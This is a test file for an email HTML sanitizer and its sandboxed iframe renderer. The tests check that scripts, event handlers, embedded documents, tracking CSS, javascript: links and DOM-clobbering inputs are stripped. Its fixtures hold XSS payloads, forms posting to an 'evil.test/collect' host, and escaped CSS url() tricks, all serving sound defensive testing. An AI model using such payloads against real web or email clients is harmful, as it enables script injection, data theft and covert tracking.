import { render, waitFor } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { EmailHtml, sanitizeEmailHtml } from '@/lib/email-html'

function sanitize(html: string, options: Parameters<typeof sanitizeEmailHtml>[1] = {}) {
  return sanitizeEmailHtml(html, {
    window,
    baseOrigin: 'https://mail.example.test',
    trustedImageOrigins: ['https://attachments.example.test'],
    ...options,
  })
}

function sanitizeToElement(html: string): HTMLDivElement {
  // A template's DocumentFragment has a separate inert owner document in jsdom,
  // which makes jest-dom's HTMLElement realm checks fail. A div models the
  // component's eventual innerHTML parse without crossing realms.
  const container = document.createElement('div')
  container.innerHTML = sanitize(html)
  return container
}

describe('email HTML safety boundary', () => {
  it('removes active content, event handlers and embedded documents', () => {
    const clean = sanitize(`
      <script>globalThis.pwned = true</script>
      <img src="x" onerror="globalThis.pwned = true">
      <iframe srcdoc="<script>alert(1)</script>"></iframe>
      <object data="https://evil.test/payload"></object>
      <embed src="https://evil.test/payload">
    `)

    expect(clean).not.toMatch(/script|onerror|iframe|srcdoc|object|embed/i)
  })

  it('keeps common form controls and their presentation state', () => {
    const content = sanitizeToElement(`
      <fieldset id="preferences" class="control-group" disabled>
        <legend>Verification options</legend>
        <label for="plan" class="field-label">Plan</label>
        <select id="plan" name="plan" size="2" multiple disabled>
          <optgroup label="Paid plans" disabled>
            <option value="pro" selected>Pro</option>
            <option value="max">Max</option>
          </optgroup>
        </select>
        <textarea id="notes" name="notes" rows="3" cols="24"
          placeholder="Optional note" readonly disabled>Draft</textarea>
        <button id="verify" type="submit" value="verify" disabled>Verify identity</button>
        <input id="remember" type="checkbox" value="yes" checked disabled>
      </fieldset>
    `)

    expect(content.querySelector('fieldset#preferences')).toHaveClass('control-group')
    expect(content.querySelector('fieldset#preferences')).toHaveAttribute('disabled')
    expect(content.querySelector('legend')).toHaveTextContent('Verification options')
    expect(content.querySelector('label.field-label')).toHaveAttribute('for', 'plan')

    const select = content.querySelector('select#plan')
    expect(select).toHaveAttribute('name', 'plan')
    expect(select).toHaveAttribute('size', '2')
    expect(select).toHaveAttribute('multiple')
    expect(select).toHaveAttribute('disabled')
    expect(select?.querySelector('optgroup')).toHaveAttribute('label', 'Paid plans')
    expect(select?.querySelector('optgroup')).toHaveAttribute('disabled')
    expect(select?.querySelector('option[value="pro"]')).toHaveAttribute('selected')
    expect(select).toHaveTextContent('Pro')
    expect(select).toHaveTextContent('Max')

    const textarea = content.querySelector('textarea#notes')
    expect(textarea).toHaveAttribute('rows', '3')
    expect(textarea).toHaveAttribute('cols', '24')
    expect(textarea).toHaveAttribute('placeholder', 'Optional note')
    expect(textarea).toHaveAttribute('readonly')
    expect(textarea).toHaveAttribute('disabled')
    expect(textarea).toHaveTextContent('Draft')

    // Submit/reset behavior is neutralized without removing the button itself.
    expect(content.querySelector('button#verify')).toHaveAttribute('type', 'submit')
    expect(content.querySelector('button#verify')).toHaveAttribute('value', 'verify')
    expect(content.querySelector('button#verify')).toHaveAttribute('disabled')
    expect(content.querySelector('button#verify')).toHaveTextContent('Verify identity')
    expect(content.querySelector('input#remember')).toHaveAttribute('type', 'checkbox')
    expect(content.querySelector('input#remember')).toHaveAttribute('value', 'yes')
    expect(content.querySelector('input#remember')).toHaveAttribute('checked')
    expect(content.querySelector('input#remember')).toHaveAttribute('disabled')
  })

  it('replaces forms with inert containers while retaining layout and children', () => {
    const content = sanitizeToElement(`
      <form id="verification-form" class="cta-shell rounded"
        style="padding: 12px; color: #123456"
        action="https://evil.test/collect" method="post" onsubmit="steal()">
        <label for="identity">Identity</label>
        <input id="identity" name="identity" value="person-123" onfocus="steal()">
        <button id="continue" type="submit" formaction="https://evil.test/alternate"
          onclick="steal()">Continue</button>
      </form>
    `)

    const inertForm = content.querySelector<HTMLElement>('#verification-form')
    expect(content.querySelector('form')).toBeNull()
    expect(inertForm).not.toBeNull()
    expect(inertForm).toHaveClass('cta-shell', 'rounded')
    expect(inertForm?.style.padding).toBe('12px')
    expect(inertForm).toHaveTextContent('Identity')
    expect(inertForm).toHaveTextContent('Continue')
    expect(inertForm).not.toHaveAttribute('action')
    expect(inertForm).not.toHaveAttribute('method')
    expect(content.querySelector('#continue')).not.toHaveAttribute('formaction')
    expect(content.querySelector('#verification-form')).not.toHaveAttribute('onsubmit')
    expect(content.querySelector('#identity')).not.toHaveAttribute('onfocus')
    expect(content.querySelector('#continue')).not.toHaveAttribute('onclick')
    expect(content.querySelector('input#identity')).toHaveAttribute('value', 'person-123')
  })

  it('does not drop input-based call-to-action buttons', () => {
    const content = sanitizeToElement(`
      <input id="persona-cta" class="button primary" style="background: #111; color: #fff"
        type="submit" value="Continue" formaction="https://evil.test/collect" onclick="steal()">
    `)

    const cta = content.querySelector<HTMLInputElement>('input#persona-cta')
    expect(cta).not.toBeNull()
    expect(cta).toHaveAttribute('type', 'submit')
    expect(cta).toHaveAttribute('value', 'Continue')
    expect(cta).toHaveClass('button', 'primary')
    expect(cta?.style.background).not.toBe('')
    expect(cta).not.toHaveAttribute('formaction')
    expect(cta).not.toHaveAttribute('onclick')
  })

  it('keeps legacy bgcolor used as the default paint for table-based email buttons', () => {
    const content = sanitizeToElement(`
      <style>table.button:hover table td { background: #0d18fc; color: #fff; }</style>
      <table class="themed-link-button radius button">
        <tr><td><table><tr>
          <td bgcolor="#3f48fd" style="color:#fff;border-radius:4px">
            <a href="https://example.test/verify" style="color:#fff;display:inline-block;padding:14px 32px">
              Verify identity
            </a>
          </td>
        </tr></table></td></tr>
      </table>
    `)

    const link = [...content.querySelectorAll('a')]
      .find((anchor) => anchor.textContent?.trim() === 'Verify identity')
    const buttonCell = link?.parentElement
    expect(buttonCell).toHaveAttribute('bgcolor', '#3f48fd')
    expect(content.innerHTML).toContain('table.button:hover table td')
  })

  it('neutralizes clobbering form controls without losing their content', () => {
    const content = sanitizeToElement(`
      <form id="clobbered">
        <input name="attributes" value="attributes">
        <input name="childNodes" value="childNodes">
        <input name="replaceWith" value="replaceWith">
      </form>
    `)

    expect(content.querySelector('form')).toBeNull()
    expect(content.querySelector('#clobbered.email-form')?.querySelectorAll('input')).toHaveLength(3)
    expect(content.textContent).not.toContain('[object HTMLInputElement]')
  })

  it('prevents non-img controls from bypassing the remote-resource policy', () => {
    const content = sanitizeToElement(`
      <input id="image-cta" type="image" src="https://tracker.test/button.png" alt="Continue">
      <input id="file-picker" type="file" capture="camera">
    `)

    const imageCta = content.querySelector<HTMLInputElement>('#image-cta')
    expect(imageCta).toHaveAttribute('type', 'button')
    expect(imageCta).toHaveAttribute('value', 'Continue')
    expect(imageCta).not.toHaveAttribute('src')
    expect(content.querySelector('#file-picker')).toHaveAttribute('disabled')
    expect(content.querySelector('#file-picker')).not.toHaveAttribute('capture')
  })

  it('renders remote HTTPS images with privacy and loading attributes', () => {
    const clean = sanitize(`
      <img src="https://images.apple.example/hero.png"
           srcset="https://images.apple.example/hero.png 1x, https://images.apple.example/hero-2x.png 2x">
      <img src="http://insecure.example/pixel.gif">
      <img src="relative-tracker.gif">
    `)

    expect(clean).toContain('src="https://images.apple.example/hero.png"')
    expect(clean).toContain('srcset="https://images.apple.example/hero.png 1x, https://images.apple.example/hero-2x.png 2x"')
    expect(clean).toContain('referrerpolicy="no-referrer"')
    expect(clean).toContain('loading="lazy"')
    expect(clean).toContain('decoding="async"')
    expect(clean).not.toContain('http://insecure.example/pixel.gif')
    expect(clean).not.toContain('relative-tracker.gif')
  })

  it('supports a remote-image privacy opt-out while retaining trusted images', () => {
    const clean = sanitize(`
      <img src="https://tracker.test/pixel.gif">
      <img src="cid:logo@example.test">
      <img src="https://attachments.example.test/file.png">
    `, { allowRemoteImages: false })

    expect(clean).not.toContain('https://tracker.test/pixel.gif')
    expect(clean).toContain('remote-image-blocked')
    expect(clean).toContain('cid:logo@example.test')
    expect(clean).toContain('https://attachments.example.test/file.png')
  })

  it('keeps responsive layout CSS and strips network or overlay capabilities', () => {
    const clean = sanitize(`
      <style>
        .desktop { display: block; width: 600px; background: #fff; }
        .mobile { display: none; position: fixed; inset: 0; z-index: 999999; }
        .tracker { background-image: url(https://tracker.test/open); }
        @import url(https://tracker.test/styles.css);
        @media (max-width: 600px) {
          .desktop { display: none !important; }
          .mobile { display: block !important; width: 100% !important; }
        }
      </style>
      <div class="desktop" style="color:#123; padding:20px; background:url(https://tracker.test/inline)">Desktop</div>
      <div class="mobile">Mobile</div>
    `)

    expect(clean).toMatch(/<style>[\s\S]*\.desktop\s*\{[^}]*display:\s*block/i)
    expect(clean).toMatch(/@media\s*\(max-width:\s*600px\)/i)
    expect(clean).toMatch(/\.mobile\s*\{[^}]*display:\s*block\s*!important/i)
    expect(clean).not.toMatch(/tracker\.test|@import|position:|z-index:|background-image|url\s*\(/i)
  })

  it('keeps safe CSS variables used by default button styles and blocks network values', () => {
    const crlfEscapedUrl = 'u\\72\r\nl(https://tracker.test/crlf)'
    const clean = sanitize(`
      <style>
        :root {
          --ButtonColor: #1747ff;
          --ButtonText: #ffffff;
          --spacing-100vh: 12px;
          --tracking: url(https://tracker.test/pixel);
          --escaped-tracking: \\75 rl(https://tracker.test/escaped);
          --crlf-escaped-tracking: ${crlfEscapedUrl};
          --viewport-height: 100vh;
          --escaped-viewport-height: 100v\\000068;
          --scientific-viewport-height: 1e2vh;
          --block-viewport-height: 100vb;
          --container-height: 100cqh;
        }
        .cta { background-color: var(--ButtonColor); color: var(--ButtonText); padding: var(--spacing-100vh); }
        .cta:hover { background-color: #002bd6; }
      </style>
      <input class="cta" type="submit" value="Verify identity">
    `)

    expect(clean).toContain('--ButtonColor: #1747ff')
    expect(clean).toContain('--ButtonText: #ffffff')
    expect(clean).toContain('var(--ButtonColor)')
    expect(clean).toContain('var(--ButtonText)')
    expect(clean).toContain('var(--spacing-100vh)')
    expect(clean).not.toMatch(/--tracking|--(?:crlf-)?escaped-tracking|--(?:escaped-|scientific-)?viewport-height|--block-viewport-height|--container-height|tracker\.test|url\s*\(/i)
  })

  it('drops iframe-height-dependent CSS that can create resize feedback loops', () => {
    const clean = sanitize(`
      <style>
        .viewport { height: 100vh; min-height: 100dvh; color: red; }
        @media (min-height: 300px) { .viewport { padding: 20px; } }
      </style>
      <div class="viewport" style="max-height: 90svh; color: blue">Content</div>
      <div class="escaped" style="height: 100v\\000068; padding-top: 5cqh; color: green">Escaped</div>
    `)

    expect(clean).toContain('color: red')
    expect(clean).toContain('color: blue')
    expect(clean).toContain('color: green')
    expect(clean).not.toMatch(/(?:[dls]?v(?:h|b|min|max)|cq(?:h|b|min|max))\b|@media\s*\([^)]*height/i)
  })

  it('normalizes safe links and strips executable or relative URLs', () => {
    const clean = sanitize(`
      <a href="javascript:alert(1)" target="_blank">unsafe</a>
      <a href="/logout" target="_top">relative</a>
      <a href="https://www.apple.com/app-store/">App Store</a>
      <a href="mailto:help@example.test" target="_top">Support</a>
    `)

    expect(clean).not.toContain('javascript:')
    expect(clean).not.toContain('href="/logout"')
    expect(clean).not.toContain('target="_top"')
    expect(clean).toContain('href="https://www.apple.com/app-store/"')
    expect(clean).toContain('target="_blank"')
    expect(clean).toContain('rel="noopener noreferrer"')
    expect(clean).toContain('href="mailto:help@example.test"')
  })

  it('renders sanitized markup inside a sandboxed iframe', async () => {
    const { container } = render(
      <EmailHtml html={'<p id="message">Hello</p><script>alert(1)</script><img src="https://images.example.test/logo.png" onerror="alert(2)">'} />,
    )
    const frame = container.querySelector<HTMLIFrameElement>('iframe')
    expect(frame).not.toBeNull()
    expect(frame).toHaveAttribute('sandbox')

    const sandboxTokens = new Set((frame?.getAttribute('sandbox') || '').trim().split(/\s+/).filter(Boolean))
    expect([...sandboxTokens].sort()).toEqual([
      'allow-popups',
      'allow-popups-to-escape-sandbox',
      'allow-same-origin',
    ])

    await waitFor(() => {
      expect(frame?.contentDocument?.querySelector('#message')).toHaveTextContent('Hello')
    })
    const frameDocument = frame?.contentDocument
    expect(frameDocument?.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content'))
      .toContain("script-src 'none'")
    expect(frameDocument?.querySelector('meta[name="referrer"]')).toHaveAttribute('content', 'no-referrer')
    expect(frameDocument?.querySelector('script')).toBeNull()
    expect(frameDocument?.documentElement.innerHTML).not.toMatch(/\bonerror\s*=/i)
    expect(frameDocument?.querySelector('img')).toHaveAttribute('referrerpolicy', 'no-referrer')
  })
})
